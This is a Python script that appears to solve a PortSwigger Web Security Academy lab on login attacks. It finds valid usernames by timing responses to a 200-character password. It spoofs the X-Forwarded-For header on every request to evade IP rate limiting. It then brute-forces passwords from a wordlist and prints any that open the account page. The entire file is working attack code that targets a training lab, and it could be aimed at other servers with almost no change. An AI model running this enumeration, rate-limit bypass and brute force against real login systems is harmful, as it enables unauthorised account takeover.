from http import HTTPStatus
from pathlib import Path

import typer
import requests
from lxml import html
from rich.console import Console
from rich.progress import track

console = Console()
app = typer.Typer()


@app.command()
def run(usernames_file: Path, passwords_file: Path, server: str = typer.Option(default=...)):
    with open(usernames_file) as f:
        usernames = [line.strip() for line in f.readlines()]
    with open(passwords_file) as f:
        passwords = [line.strip() for line in f.readlines()]
    SERVER = f"https://{server}.web-security-academy.net"

    existing_usernames = []
    for username in track(usernames, description="Searching for username...", console=console):
        console.log(f"{username} ???")
        response = requests.post(
            f"{SERVER}/login",
            data={
                "username": username,
                "password": "A" * 200,
            },
            headers={
                "X-Forwarded-For": username,
            }
        )
        if response.status_code == HTTPStatus.OK:
            html_document = html.fromstring(response.content)
            if response.elapsed.total_seconds() >= 0.75:
                print(f"*** FOUND? ***")
                existing_usernames.append(username)

    for username in existing_usernames:
        print(f"Trying with {username}...")
        for password in passwords:
            response = requests.post(
                f"{SERVER}/login",
                data={
                    "username": username,
                    "password": password,
                },
                headers={
                    "X-Forwarded-For": password,
                }
            )
            if response.status_code == HTTPStatus.OK:
                html_document = html.fromstring(response.content)
                title = html_document.xpath("//h1")[0].text
                if title == "My Account":
                    print(password)


if __name__ == "__main__":
    app()